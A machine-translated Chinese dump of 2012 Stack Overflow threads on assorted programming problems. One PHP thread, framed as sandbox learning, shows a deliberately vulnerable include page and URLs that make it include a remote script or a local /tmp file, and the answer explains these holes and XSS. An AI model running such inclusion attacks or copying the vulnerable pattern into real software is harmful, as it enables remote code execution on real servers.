> 
> 时间：2012-09-28T19:58:56.057

使用 .net 反射。这是如何执行此操作的好示例：

[http://towardsnext.wordpress.com/2008/09/17/listing-types-and-methods-of-assembly-reflection/](http://towardsnext.wordpress.com/2008/09/17/listing-types-and-methods-of-assembly-reflection/)

# c++ - 创建一个进程并杀死它

> ID：12646554
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:56:09.887
> 
> 标签：c++, linux, ubuntu, clang

我正在处理一项任务，该任务要求我创建一个子进程，然后等待 300 秒并终止该进程，而父进程应在创建子进程后 200 秒被终止。我正在使用 Clang++ 编译器在 Ubuntu 的 C++ 中执行此操作。我对 C++ 非常陌生，并且已经使用 Java 一段时间了。我现在所拥有的可能更像是伪代码而不是其他任何东西，我真的怀疑它是否有效。当我编译它给我关于我的 kill() 调用的错误时，我尝试了诸如 *this.kill() 或 this.kill() 之类的东西，但都没有奏效。如何使用 kill 命令？另外，这段代码看起来像我想要的吗？恐怕它甚至不接近。

```
#include <iostream>
#include <unistd.h>
using namespace std;

class process{

public:
    process(){
        main();
    }

    void main(){
        process *parent = new process();
        int pid;
        pid=fork();
        if (pid == 0)
        {   
            sleep(200);
            kill();
        }
        else
        {
            sleep(100);
            kill();
        }
    }   
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:21:48.993

您的代码的结构类似于 Java 命令行程序，其中主入口点是`main()`在某个（非特定）类中命名的函数。C++ 程序也使用 main() 作为入口点，但它必须是顶层的函数，而不是类方法。

通常，您将拥有一个最小的 C++ 程序：

```
int main(int argc, char *argv[])
{
    ...
    return 0;
} 
```

在您的程序中，最好避免完全上课；考虑到您只运行一些简单的程序代码，没有必要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:58:25.403

系统`kill`调用需要几个参数：要杀死的进程的*进程 ID*和特定的信号。没有没有参数的调用版本，例如只是杀死当前进程。

查看 kill 的手册页，[这是](http://linux.die.net/man/2/kill)手册页的 linux 版本。

请注意 frim *unistd.h*您还可以访问`getpid` 可用于获取调用进程的进程 ID 的调用，请参阅[man getpid](http://linux.die.net/man/3/getpid)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:00:02.490

`kill`是用于向进程发送信号的系统调用，您必须指定正确的信号作为其第二个参数（第一个是接收进程的进程 ID），如下所示：

```
kill(pid,SIGKILL); 
```

# javascript - 用 Javascript 表示 DAG 的数据结构

> ID：12646560
> 
> 赞同：5
> 
> 时间：2012-09-28T19:56:45.647
> 
> 标签：javascript, graph, directed-acyclic-graphs

我有一个字符串，我需要使用 javascript 将其解析为图形 (DAG) 数据结构。数据结构中包含一些我应该存储的属性，例如节点的 id、名称和一个标签，如果一个节点存在到另一个节点，则给链接。所以，一个例子是

```
Node1 (id: 1, name: 'first') --('link name')--> Node2 (id:....) 
```

等等。创建数据结构后，除了读取它之外，我不需要对其进行任何其他操作（稍后我将使用它来使用 d3 呈现可视化）。节点的数量不会很多，因为其中有几个是共享的。

我正在想象一个邻接列表，但不确定如何在 javascript 中对其进行编码。例如，我知道一个 json 对象可以有一个“字段”：“值”结构，但我可以用 Object 来做到这一点：[相邻对象列表]？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-30T03:51:43.170

您可以在 json 中使用列表（数组）。例如，我可以将一个简单的有向图表示为

```
{
  "NodeA": {"name": "NodeA", "adjacentTo": ["NodeB", "NodeC"]},
  "NodeB": {"name": "NodeB", "adjacentTo": ["NodeC", "NodeD"]},
  "NodeC": {"name": "NodeC", "adjacentTo": ["NodeA"]},
  "NodeD": {"name": "NodeD", "adjacentTo": []}
} 
```

这将是图表：

```
C
^^
| \
|  \
A -> B -> D 
```

name 字段确实不需要，但您可以通过这种方式将所需的任何属性与节点相关联。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:18:58.073

JavaScript 对象必须有字符串键，但可以存储任何类型的值。当然，id 的全部意义在于允许您用简单的类型来表示复杂类型。

```
var adjacentTo = {};
adjacentTo[node1.id] = [node2, node3] 
```

# objective-c - NSMutableSet 的 addObject 方法是否替换重复或忽略插入？

> ID：12646562
> 
> 赞同：3
> 
> 时间：2012-09-28T19:56:48.337
> 
> 标签：objective-c, ios, cocoa-touch, collections

我正在努力弄清楚是否将一个已经存在的对象添加到 Cocoa 中的集合实际上会替换该对象，或者`addObject:`如果有重复则只是忽略。如果特定字段相等，我正在使用一个被认为与另一个对象相同的自定义对象。

我同时覆盖了`isEqual:`和`hash`方法，并且在调用它时`containsObject:`确实返回`true`了，但是我想用新对象更新集合，由于某种原因，如果我调用`addObject:`.

`NSMutableSet`如果它确实忽略了它，为了达到预期的效果，最好的数据结构是什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-28T20:01:12.033

[从描述](http://developer.apple.com/library/ios/documentation/cocoa/reference/Foundation/Classes/NSMutableSet_Class/Reference/NSMutableSet.html#//apple_ref/occ/instm/NSMutableSet/addObject%3a)中，如果有重复，它会*忽略。*

> **如果给定对象还不是成员**，则将给定对象添加到集合中。

 **您可以将 NSMutableSet 转换为 CFMutableSet，它具有允许更好地控制如何添加对象的方法（您需要 CFSetSetValue）：

*   [**CFSetSetValue**](https://developer.apple.com/library/ios/documentation/CoreFoundation/Reference/CFMutableSetRef/Reference/reference.html#//apple_ref/doc/uid/20001503-CH201-F11095)：要在 theSet 中设置的*值*。如果该值已存在于*theSet*中，则将其替换。

*   [**CFSetAddValue**](https://developer.apple.com/library/ios/documentation/CoreFoundation/Reference/CFMutableSetRef/Reference/reference.html#//apple_ref/doc/uid/20001503-CH201-F11073)：如果集合中已经存在*值，则此函数不执行任何操作就返回。*

*   [**CFSetReplaceValue**](https://developer.apple.com/library/ios/documentation/CoreFoundation/Reference/CFMutableSetRef/Reference/reference.html#//apple_ref/doc/uid/20001503-CH201-F11093) *：如果set*中不存在此值，则该函数不执行任何操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:02:06.137

`NSMutableSet`的[`-addObject:`](http://developer.apple.com/library/ios/documentation/cocoa/reference/Foundation/Classes/NSMutableSet_Class/Reference/NSMutableSet.html#//apple_ref/occ/instm/NSMutableSet/addObject%3a)方法*不会*添加通过`-member:`测试的对象，因此它不会做任何事情。

如果你仍然想用新对象更新集合，你可以使用一个`NSMutableArray`，你会调用它[`-replaceObjectAtIndex:withObject:`](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSMutableArray_Class/Reference/Reference.html#//apple_ref/doc/uid/20000138-BABBBECB)：

```
@interface NSMutableArray(JRAdditions) 
- (void)addUniqueObject:(id)object;
@end

@implementation NSMutableArray(JRAdditions) 
- (void)addUniqueObject:(id)object {
    NSUInteger existingIndex = [self indexOfObject:object];
    if(existingIndex == NSNotFound) {
       [self addObject:object];
       return;
    }
    [self replaceObjectAtIndex:existingIndex withObject:object];
}
@end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:00:25.137

它不做任何事情就返回。与[该类的文档](https://developer.apple.com/library/ios/#documentation/CoreFoundation/Reference/CFMutableSetRef/Reference/reference.html)`NSMutableSet`免费桥接：`CFMutableSet`

> 如果集合中已经存在值，则此函数不执行任何操作而返回。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-01T05:32:59.127

对不起，你错过了“平等”的概念。如果您需要将一个对象添加到一个集合中，因为它不同，那么“等于”运算符需要返回它是不同的。替换集合中的对象的唯一有效时间是它完全相同。基本集合语义。如果您试图用不同的对象替换一个对象，那么您所描述的不是一个集合。那是一种不同类型的键控集合。我可能会建议最合乎逻辑的一本是基本字典。键=值。因此，您只需分配字典[“objectId”] = object，它自然会添加或替换。您需要使用正确的工具来完成这项工作。**

# php - 防御漏洞

> ID：12646563
> 
> 赞同：1
> 
> 时间：2012-09-28T19:56:55.727
> 
> 标签：php, security, exploit

我已经设置了一个沙箱并尝试运行漏洞利用，以便更好地了解如何更好地防御它们。当我运行以下命令时，该过程因正确原因而失败。但是我不确定，因为我找不到很多“如何编写适当的漏洞利用”。这是我的代码，以下是失败消息。任何指导都会很棒。

```
 //unform.php (unprotected form)
 <html>
 <head>
 <title>Try An Exploit</title>
 <?php
 if (!empty($_GET)){
    foreach($_GET as $key=>$value){
    ${$key} = $value;
    }
}

 //no sanitizer here.
 echo $key;
 include($value);
 ?>
 </head>
 <body>
 <h1>This Is Bad</h1>

 <form action="#" method="get">
<select name="COLOR">
       <option value="red">red</option>
       <option value="blue">blue</option>
    </select>
<input type="submit" value="Kick Me" />
 </form>
 </body> 
```

利用脚本，简单的东西：

```
 exploit.php
 <?php
   $somevar = "This is just a string";
   echo $somevar;
 ?> 
```

坏人会在他们的浏览器地址栏中硬编码以下内容：

```
 http://www.sandbox.com/path/to/unform.php?COLOR=http://www.remoteserv.com/exploit.php 
```

尝试加载地址时输出到浏览器：

```
 Warning: include() [function.include]: http:// wrapper is disabled in the server configuration by allow_url_include=0 
```

是这样吗？或者还有其他我应该注意的技术吗？
谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:10:57.247

看起来有问题的漏洞是执行任意脚本。由于某些 php.ini 设置，该脚本不容易受到*远程*脚本的任意执行的影响——但它容易受到本地脚本的任意执行的影响。

# 任意执行远程脚本

默认情况下，`allow_url_include`php.ini 指令设置为`0`- 阻止您包含远程文件，如下所示：

```
include("http://www.remoteserv.com/exploit.php"); 
```

...或同样如此：

```
$myVar = "http://www.remoteserv.com/exploit.php";
include($myVar); 
```

有关更多信息，请参阅[运行时配置 - 文件系统和流配置选项](http://php.net/manual/en/filesystem.configuration.php)和[使用 php.net 上的远程脚本](http://php.net/manual/en/features.remote-files.php)。

从技术上讲，您仍然容易受到攻击，因为用户可以提供导致错误的输入 - 实际上您应该清理该输入 - 但您不容易受到远程脚本的任意执行的攻击。

# 任意执行本地脚本

但是 php.ini 指令并不能保护您免受本地脚本执行的影响。攻击者可以使用类似...的 URL

```
http://www.sandbox.com/path/to/unform.php?wtv=/tmp/SomeFile.php 
```

...并且该文件将被包含在内。它可能是非 PHP 文件（导致错误），也可能是攻击者放置在您服务器上的文件 - 通过文件上传或[共享主机环境](http://en.wikipedia.org/wiki/Shared_web_hosting_service)。

为了进一步阅读，[《Essential PHP Security》一书的第 5 章](http://phpsecurity.org/contents#ch05)完全专注于[include](http://php.net/manual/en/function.include.php)的安全性。

# 其他

你**也**容易受到[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)的攻击：

```
echo $key; 
```

输出时`$key`- 这是输入 - 您应该以某种方式对输出进行编码，可能使用[`htmlentities(...)`](http://php.net/manual/en/function.htmlentities.php).

您还使用使用输入来操作变量：

```
${$key} = $value; 
```

...这是一个坏主意。

# python - wxPython Resize with scrolledPanel 有时会破坏按钮的绘制

> ID：12646564
> 
> 赞同：2
> 
> 时间：2012-09-28T19:56:56.683
> 
> 标签：python, resize, wxpython, repaint

我有一个使用 ScrolledPanel 的 wxPython 程序，它在某些调整大小时做了一些非常奇怪的事情。如果您稍微拖动调整大小，其中一个按钮将开始看起来混乱。

之前： [http ://s7.postimage.org/stoc27517/Good_Window.png](http://s7.postimage.org/stoc27517/Good_Window.png)

之后： [http ://s9.postimage.org/s2apf38m7/Bad_Window.png](http://s9.postimage.org/s2apf38m7/Bad_Window.png)

这是代码：

```
import wx
import wx.lib.scrolledpanel as scrolled

class TestApp(wx.Frame):
    def __init__(self, *args, **kwargs):
        super(TestApp,self).__init__(*args,**kwargs)
        self.setupGUI()

    def setupGUI(self):

        #Fires on window resize
        self.Bind(wx.EVT_SIZE, self.OnSize)

        self.box = wx.BoxSizer(wx.VERTICAL)
        self.SetSizer(self.box)

        self.scrolling_window = scrolled.ScrolledPanel( self )
        self.scrolling_window.SetAutoLayout(1)
        self.scrolling_window.SetupScrolling()

        self.gb = wx.GridBagSizer(5,5)
        self.scrolling_window.SetSizer(self.gb)

        self.btnOne = wx.Button(self.scrolling_window,label='One')
        self.btnTwo = wx.Button(self.scrolling_window,label='Two')

        self.gb.Add(self.btnOne, pos=(0,0), flag=wx.EXPAND)
        self.gb.Add(self.btnTwo, pos=(1,1), flag=wx.ALIGN_BOTTOM)

        self.gb.AddGrowableCol(0)
        self.gb.AddGrowableRow(1)

        self.box.Add(self.scrolling_window,1,wx.EXPAND)

        self.Show(True)

    def OnSize(self, e):
        #This refresh shouldn't be necessary
        #self.Refresh()

        #Pass event up the chain so window still resizes
        e.Skip()

if __name__ == '__main__':
    app = wx.App(redirect=False)
    TestApp(None)
    app.MainLoop() 
```

我可以防止这种行为的唯一方法是取消注释 OnSize 方法中的 self.Refresh() 。这基本上会在每个窗口调整大小时强制重新绘制。但我不认为这应该是必要的。这是一个错误，还是我做错了什么？

# jquery - Jquery取消选中任何复选框获取ID

> ID：12646565
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:57:04.107
> 
> 标签：jquery

我正在使用 jQuery，当未选中复选框时，我需要显示它的 id。我怎样才能做到这一点？

```
$('input[type=checkbox]').click(function(){ 
    alert(this.id); 

    if($(this).is(':unchecked')) {
         alert(this.id); 
    } 
}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-28T20:01:25.513

查看此**[演示](http://jsfiddle.net/4q3c4/)**以获取工作示例。

鉴于您的代码：

```
$('input[type=checkbox]').click(function(){ 
    alert(this.id);     
    if($(this).is(':unchecked')) {
         alert(this.id); 
    } 
}); 
```

您需要更改`:unchecked`为`:not(:checked)`. jQuery 从来没有`:unchecked`过滤器。除此之外，你相当接近。

```
$("input[type=checkbox]").on("click", function(){
   if($(this).is(":not(:checked)"))
      alert(this.id);
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T19:58:42.710

**OP更改后更新**

您可以在单击时使用长度来选中未选中的复选框，如下所示。

**[现场演示](http://jsbin.com/inixik/1/edit)**

```
$('input[type=checkbox]').click(function(){ 
    alert(this.id); 

    if($(this).not(':checked').length) {
         alert(this.id); 
    } 
}); 
```

[**现场演示**](http://jsbin.com/inixik/1/edit)

```
$('input[type=checkbox]').click(function(){
    if(this.checked)
      alert(this.id + " checked");
    else
      alert(this.id + " un-checked");

}); 
```

或者

```
$('input:checkbox').click(function(){

     alert($(this).attr('id'));

}); 
```

或复选框有 class = "chkclass"

```
 $('.chkclass').click(function(){

     alert(this.id);

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T19:58:59.457

这些方面的东西应该适合你。

```
$('input[type=checkbox]').click(function() {
    $checkbox = $(this);

    if(!$checkbox.is(':checked'))
        alert($checkbox .attr("id"));
}); 
```

或者，如果有可能动态添加复选框，请使用 jquery [`on()`](http://api.jquery.com/on/)：

```
$('input[type=checkbox]').on("click", function() {
    $checkbox = $(this);

    if(!$checkbox.is(':checked'))
        alert($checkbox .attr("id"));
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T19:59:34.277

执行以下操作：

```
$("input[type='checkbox']").live("click", function() {
    if (!$(this).attr("checked")) {
        alert($(this).attr("id"));
    }
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T20:07:52.337

没有名为**':unchecked' 的选择器**

你几乎接近了，尝试**:checked** 代替

```
$(function() {

    $('input[type="checkbox"]').on('click', function() {

         if(! $(this).is(':checked')){
            alert( 'ID of the current checkbox is : ' + this.id );
         }
    })

}); 
```

[演示](http://jsfiddle.net/sushanth009/2v45X/)

# sql - SQL - 有条件地将同一表中的两列合并为一列

> ID：12646572
> 
> 赞同：0
> 
> 时间：2012-09-28T19:57:25.043
> 
> 标签：sql

我正在使用一个包含两个版本的存储信息的表。为了简化它，一列包含文件运行的旧描述，而另一列包含显示运行文件的更新标准。它变得更加复杂，因为较旧的色谱柱本身可以有多个标准。桌子：

```
Old Column              New Column
Desc: LGX/101/rpt          null
  null                     Home
Print: LGX/234/rpt         null
  null                     Print
  null                     Page 
```

我需要将两列合二为一，但我还需要从旧列值的开头删除“Print:”和“Desc:”字符串。有什么建议么？如果/当我忘记了您需要知道的事情时，请告诉我！

（我正在使用 Cache SQL 编写代码，但我只是想要一个通用的方法来解决我的问题，我可以弄清楚过去的细节。）

编辑：条件是 if substr(oldcol,1,5) = 'desc:' then substr(oldcol,6) else if substr(oldcol,1,6) = 'print:' then substr(oldcol,7) etc . 以便取出“desc：”和“print：”以对数据进行一些清理。

EDIT2：我想让表格看起来像这样：

```
 Col
  LGX/101/rpt
    Home
  LGX/234/rpt
    Print
    Page 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:06:38.343

很难准确地理解你在寻找什么。以上是否代表需要合并/合并的之前/之后，或两列。

我的猜测是这`COALESCE`可能会对你有所帮助。它接受一堆参数并返回第一个非 NULL。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:09:58.217

如果 old 为 NULL，您似乎想从 new 中获取值，如果 new 为 null，则从 old 中获取值。为此，您可以在 SQL 中使用 case 语句。我知道 MySQL 支持 CASE 语句，我不确定它们是否会帮助你。

`SELECT (CASE WHEN old_col IS NULL THEN new_col ELSE old_col END) as val FROM table_name`

如果 old_col 为 NULL，这将获取 new_col，否则将获取 old_col。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T21:52:56.880

您可以使用 CharIndex 和 Substring 函数的组合删除 Print: 和 Desc:。来了

```
SELECT  CASE WHEN CHARINDEX(':',COALESCE(OldCol,NewCol)) > 0 THEN 
         SUBSTRING(COALESCE(OldCol,NewCol),CHARINDEX(':',COALESCE(OldCol,NewCol))+1,8000) 
         ELSE
         COALESCE(OldCol,NewCol)
        END AS Newcolvalue  
FROM  [SchemaName].[TableName] 
```

Charindex 给出了您正在搜索的字符/字符串的位置。

因此，您在计算列（Coalesce 部分）中获得“：”的位置并将该值传递给子字符串函数。然后在表示子串函数的位置加上+1，得到“:”后面的部分。现在你有了一个没有“Desc:”和“Print:”的字符串。

希望这可以帮助。

# html - Ruby：根据数组值更改类

> ID：12646574
> 
> 赞同：0
> 
> 时间：2012-09-28T19:57:35.903
> 
> 标签：html, css, ruby-on-rails, ruby, class

我正在寻找一个基于 Ruby 数组值的类的 HTML 结构。我有 6 个类将应用于 8x8 网格上的不同元素。每行都是一个 div，里面有 8 个 span 元素。在 ruby​​ 中，每个嵌套数组将是 div 行，然后每个元素将是一个跨度，根据数组元素的值分配一个类。

```
a = [[1,4,3,2,2,3,1,4]
     [4,5,6,6,3,2,3,5]] 
```

因此将创建两行，其中包含 8 个元素，其中包含适当的类。是否可以在 Ruby 中像这样将数据结构转换为 HTML？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:21:46.513

也许这就是你想要的：

```
a = [[1,4,3,2,2,3,1,4],
     [4,5,6,6,3,2,3,5]]

html = ''
a.each do |row|
  html << "<div>%s</div>" % row.map { |c| %{<span class="#{c}"></span>} }.join
end

# puts html 
```

**更新**

换句话说：

```
html = a.map do |row|
  "<div>%s</div>" % row.map { |c| %{<span class="#{c}"></span>} }.join
end.join 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:02:40.443

嗯..是的。诸如此类的东西...

```
a.each do |subArray|
  puts "<div>"
  subArray.each do |element|
    puts '<span class="#{element}">Some text</span>'
  end
  puts "</div>
end 
```

如果这不符合您的需求，请发布更具体的问题。

# tfs - 使用 TFS 2010 Api 进行深度查询

> ID：12646579
> 
> 赞同：1
> 
> 时间：2012-09-28T19:57:50.910
> 
> 标签：tfs, tfs-sdk

谁能告诉我如何使用 TFS API 进行深度查询并避免查询 TFS 数据库（miscrofot 说这不是最好的事情）。

我将在下面解释我的想法：
我有一棵这样的树

```
 $/tfs/ProjectNameXX/Version/1/SR/SR0 (subdirectory)
                                   SR1 (subdirectory) 
```

我如何使用 API 进行简单查询以进行检索，例如：

*   ProjectNameXX 的版本
*   版本等于 1 且“项目名称”= ProjectNameXX 的 ProjectNameXX 的 SR

我已经做了一些方法来检索上面的示例中的数据，但这不是一件好事，因为如果树的结构发生了变化：没有任何效果。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T04:52:36.650

我假设您在谈论源代码控制而不是区域。

```
TfsTeamProjectCollection tpc = new TfsTeamProjectCollection("http://url");
VersionControlServer _versionControlServer = tpc.GetService<VersionControlServer>();
versionControlServer.GetItems("$//tfs/*.*", VersionSpec.Latest, RecursionType.Full, DeletedState.NonDeleted, ItemType.File).Items; 
```

这将递归地获得所有文件的列表，然后您必须手动遍历它们以确定您想要什么。

但是，是的，如果结构发生变化，您仍然会遇到问题。

# css - webkit-font-smoothing：chrome 和 safari 的结果突然不同

> ID：12646592
> 
> 赞同：6
> 
> 时间：2012-09-28T19:58:46.880
> 
> 标签：css, fonts, rendering, font-face, webfonts

我曾经在两个 webkit 浏览器（Chrome 和 Safari）中都有相同的输出，但是突然之间（我不知道我可以改变什么，Chrome 中的渲染看起来很糟糕。

**这是我的html**

```
<li class="cat-item term term-workshops"><a href="/workshops">Workshops</a></li> 
```

**这是我的CSS**

```
.term a {
    display:inline-block;
    height:1em;
    -webkit-font-smoothing:antialiased;
    -moz-font-smoothing:antialiased;
    font-smoothing:antialiased;
    text-rendering:optimizeLegibility;
    font-smooth:always;
}

.term-workshops a {
    text-transform:lowercase;
    font-family:"Custom-Family", sans-serif;
    font-size:1.4em;
    margin-top:.1em;
} 
```

* * *

*Safari 中的输出看起来不错（它曾经在 Chrome 中看起来相同）*

![苹果浏览器](../Images/65292b554a9570747ea2c1b89fcb7f7b.png "苹果浏览器")

*Chrome 中的输出看起来突然很糟糕*

![苹果浏览器](../Images/c06b73f0975ab5da560a955e9d23dde6.png "苹果浏览器")

知道为什么这会对两个 webkit 浏览器产生影响吗？我知道它在 Firefox 中看起来很糟糕，因为没有`font-smoothing`选项，但如果可能的话，它在 Chrome 和 Safari 中应该看起来一样。

我可以在我的 css 中改变什么，使输出看起来突然不同？我知道它在两种浏览器中看起来都一样！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T20:22:38.837

[https://productforums.google.com/forum/?fromgroups=#!topic/chrome/0vqp1bnkaoE](https://productforums.google.com/forum/?fromgroups=#!topic/chrome/0vqp1bnkaoE)

> -webkit-font-smoothing 不再有效。谷歌浏览器团队有意改变了这种行为。似乎字体平滑在以前的版本中没有在 OSX 上“正确”应用。

# css - 无点引擎解析器返回空字符串

> ID：12646603
> 
> 赞同：16
> 
> 时间：2012-09-28T19:59:45.337
> 
> 标签：css, parsing, asp.net-mvc-4, less, bundling-and-minification

ASP.Net MVC4 + Bootstrap (LESS) + dotLess。

目标是将 Bootstrap`.less`文件转换为一个单独的`.css`.

### 捆绑配置

```
var bootstrapStyles = new Bundle("~/bundle/style/bootstrap").Include("~/Content/less/*.less");
bootstrapStyles.Transforms.Add(new LessTransform());
bootstrapStyles.Transforms.Add(new CssMinify());
bundles.Add(bootstrapStyles); 
```

只有 bootstrap 的 less 文件，不应该有任何红旗语法问题。

下一步是构建该转换器类`LessTransform`以生成 css。

转换器类实现了`Process()`内部存在问题的代码......这是两种情况及其问题：

### 场景一：静态`Less.Parse()`

```
var parsedLess = Less.Parse(bundle.Content);
bundle.Content = parsedLess;

// Throws a FileNotFoundException
// "You are importing a file ending in .less that cannot be found."
// reset.less and it definitely exists in that folder. 
```

### 场景 2：LessEngine.TransformToCss()

```
var content = new StringBuilder();
var engine = new LessEngine();

foreach (var file in bundle.Files)
{
    // text is extracted correctly.
    var text = File.ReadAllText(file.FullName);
    // transform function returns an empty string, no errors
    var css = engine.TransformToCss(text, file.FullName);
    content.AppendLine(css);
}
bundle.Content = content.ToString(); 
```

### 问题

有人对这些错误中的任何一个有见解吗？知道任何解决方案吗？对我来说都没有意义。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-29T01:24:36.223

哇！要想找到问题的根源，需要进行大量的跳跃。

解决此类问题的一个好策略是将层剥离到最简单的情况。您没有看到任何错误消息，因为捆绑过程中的某些内容占用了 dotless 的日志消息，应该单独处理。这假设您打开了无点错误日志记录。

相反，使用：

@Styles.Render("~/bundle/style/bootstrap")

采用

```
<link rel="stylesheet/less" href="~/Content/style/bootstrap.less" type="text/css" /> 
```

当您尝试在浏览器中查看 less 文件时，您应该收到以下消息：

> 文件“/Content/Themes/bootstrap/mixins.less”中第 253 行的格式无法识别的指令块：
> 
> [[252]: // 来自http://toekneestuck.com/blog/2012/05/15/less-css-arguments-variable/](http://toekneestuck.com/blog/2012/05/15/less-css-arguments-variable/)的多重阴影解决方案 [253]: @props: ~ `"@{arguments}".replace(/[\[\]]|\,\sX/g, '')`; --^ [254]：-webkit-box-shadow：@props；

这个问题的根源在于引导程序中的一个 hack，它不能很好地与 dotless 配合使用。要解决此问题，请替换 mixins.less 中的以下行：

```
// Drop shadows
.box-shadow(@shadowA, @shadowB:X, ...){
  // Multiple shadow solution from http://toekneestuck.com/blog/2012/05/15/less-css-arguments-variable/
  @props: ~`"@{arguments}".replace(/[\[\]]|\,\sX/g, '')`;
  -webkit-box-shadow: @props;
     -moz-box-shadow: @props;
          box-shadow: @props;
} 
```

使用以下几行：

```
// Drop shadows
.box-shadow(@shadow){
  -webkit-box-shadow: @shadow;
     -moz-box-shadow: @shadow;
          box-shadow: @shadow;
}
.box-shadow(@shadow1, @shadow2) {
  -webkit-box-shadow: @shadow1, @shadow2;
     -moz-box-shadow: @shadow1, @shadow2;
          box-shadow: @shadow1, @shadow2;
}
.box-shadow(@shadow1, @shadow2, @shadow3) {
  -webkit-box-shadow: @shadow1, @shadow2, @shadow3;
     -moz-box-shadow: @shadow1, @shadow2, @shadow3;
          box-shadow: @shadow1, @shadow2, @shadow3;
} 
```

希望这对你有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:39:01.757

**场景 1（已解决）**

事实证明，它实际上并没有在“reset.less”上失败，而是在“bootstrap.less”上，第一行是“reset.less”的导入语句。在循环中实施路径解析器解决了该问题。

```
// let them throw exceptions on casting because they should never be null.
var importer = (Importer)lessParser.Importer;
var filereader = (FileReader)importer.FileReader;
// "As" casting here ensures if the path resolver is another type that we cannot cast 
// (ex. RelativePathResolver) that we get a null rather than an exception.
var pathresolver = filereader.PathResolver as ImportedFilePathResolver;
if (pathresolver != null)
    pathresolver.CurrentFilePath = currentFilePath;
else
    filereader.PathResolver = new ImportedFilePathResolver(currentFilePath); 
```

**场景 2（仍然破碎）**

请参阅上面乔尔的回答。它是正确的。需要注意的一点是，这个 Tony Stark hack 将从 Bootstrap 2.1.2 中删除，指日可待：[https ://github.com/twitter/bootstrap/issues/5079](https://github.com/twitter/bootstrap/issues/5079)

# compilation - m3u8-segmenter 未编译

> ID：12646604
> 
> 赞同：0
> 
> 时间：2012-09-28T19:59:49.160
> 
> 标签：compilation, ffmpeg, m3u

```
root@ip-**-**-**-**:/home/jeff/m3u8-segmenter# ./configure
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... /bin/mkdir -p
checking for gawk... no
checking for mawk... mawk
checking whether make sets $(MAKE)... yes
checking for gcc... gcc
checking whether the C compiler works... yes
checking for C compiler default output file name... a.out
checking for suffix of executables...
checking whether we are cross compiling... no
checking for suffix of object files... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ISO C89... none needed
checking for style of include used by make... GNU
checking dependency style of gcc... gcc3
checking whether make sets $(MAKE)... (cached) yes
checking how to run the C preprocessor... gcc -E
checking for grep that handles long lines and -e... /bin/grep
checking for egrep... /bin/grep -E
checking for ANSI C header files... yes
checking for sys/types.h... yes
checking for sys/stat.h... yes
checking for stdlib.h... yes
checking for string.h... yes
checking for memory.h... yes
checking for strings.h... yes
checking for inttypes.h... yes
checking for stdint.h... yes
checking for unistd.h... yes
checking for sys/types.h... (cached) yes
checking signal.h usability... yes
checking signal.h presence... yes
checking for signal.h... yes
checking getopt.h usability... yes
checking getopt.h presence... yes
checking for getopt.h... yes
checking for stdlib.h... (cached) yes
checking for GNU libc compatible malloc... yes
checking for memmove... yes
checking for memset... yes
checking for strrchr... yes
checking for strtol... yes
./configure: line 4160: PKG_PROG: command not found
./configure: line 4161: syntax error near unexpected token `FFMPEG,'
./configure: line 4161: `PKG_CHECK_MODULES(FFMPEG, libavformat libavcodec libavutil)' 
```

我的所有依赖项都已到位，包括 FFMPEG、PKG_PROG 等，但我遇到了这些错误并且不知所措。有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-15T18:06:06.747

我已经在 Mac OSX 10.8 上成功编译了这段代码，但我之前确实遇到过这个错误。我所做的是转到那些行号并注释掉这些检查。我相信它所做的只是对 FFMPEG、avformat 等进行一些验证，如果您按照说明进行操作，应该已经完成​​了。然后我重新运行 ./configure 和 make。最终的二进制文件效果很好。没有问题。除此之外，从头开始重新开始您的步骤，但跳过 aclocal、automake 等。只需运行./configure。这也对我有用，二进制代码运行良好。我一直在努力使用分段器，没有任何问题，但同样，这是在 Mac OSX 10.8 上。祝你好运。！

# android - 电话：带有扩展名的链接适用于 iOS 但不适用于 Android

> ID：12646614
> 
> 赞同：1
> 
> 时间：2012-09-28T20:00:30.247
> 
> 标签：android, iphone, html, tel

我有一个看起来像这样的链接：

```
<a href = "tel:1234567890pp2149">Call Support</a> 
```

使用 iOS 设备时，此链接可以正常工作。在 Android 上单击链接时，电话会尝试拨打`1234567890`（不带分机号的号码）。这样做的正确方法是什么，以便它可以跨设备工作

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T21:29:50.843

